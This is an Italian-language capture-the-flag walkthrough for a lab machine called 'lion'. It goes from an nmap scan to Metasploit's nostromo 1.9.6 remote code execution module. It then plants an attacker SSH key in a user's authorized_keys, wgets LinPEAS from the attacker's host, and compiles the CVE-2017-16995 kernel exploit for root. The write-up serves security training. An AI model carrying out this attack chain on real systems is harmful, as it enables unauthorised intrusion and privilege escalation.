# lion
partiamo con uno scan 

```bash
nmap lion.thm -sV -sC 
```

troviamo 2 porte interessanti la porta 8080 e la 1337 

avete più possibilità io ho individuato 2 problemi principali di questa web app 
principalmente nostromo usa un paramentro http_verify che permette all'attacante di inviare comandi 
in questo caso vi consiglio di avviare metasploit
```bash
msfconsole
```
tramite questo cercate nostromo 
```bash
search nostromo
```

dovreste vedere una vulnerabilità di questo tipo nostromo 1.9.6 - Remote Code Execution

fate il comando 
```bash
use vulnerabilità trovata
```
aggiungete tutti i campi dell'exploit

fate run 

ed ecco che avremmo una console dove lanciare tutti i comandi che ci servono

i comandi che seguono serviranno per capire con che utente ci troviamo e per creare un chiave ssh che useremo dopo
```bash
id
```
genero una key per l'ssh
```bash
ssh-keygen
```
inserisco la chiave generata al posto di quella che esisteva già e tramite questa mi autorizzo l'accesso all'ssh
```bash
mkdir /home/gloria/.ssh; echo '<il file sshkey.pub>' > /home/gloria/.ssh/authorized_keys
```

tramite l'sshkey generata e salvata sulla nostra macchina facciamo la connessione in ssh

## ssh

```bash
ssh -i sshkey gloria@<lion.thm> -p 1337
```
ottimo siamo sull'ssh andiamo a fare il privesc

## privesc

scarichiamo LinPEAS.sh sulla nostra macchina e passiamolo sulla macchina attaccata

```bash
python3 -m http.server 80
```
comando da eseguire sulla macchina attaccata:
```bash
wget http://vostroip/LinPEAS.sh
```

diamo i giusti permessi allo script
```bash
chmod +x LinPEAS.sh
./LinPEAS.sh
```

il kernel è vulnerabile andiamo ad usare l'exploit 
cve-2017-16995
scarichiamolo e andiamo a compilare sulla macchina per evitare corruzioni
fate i passaggi come se voleste passare linpeas.
una volta che il file cve-2017-16995.c si trova sulla macchina eseguite questo comando per compilarlo
```bash
gcc --static cve-2017-16995.c -o cve-2017-16995 && chmod +x cve-2017-16995 
```

avviatelo e il gioco e fatto!
```bash
./cve-2017-16995
```




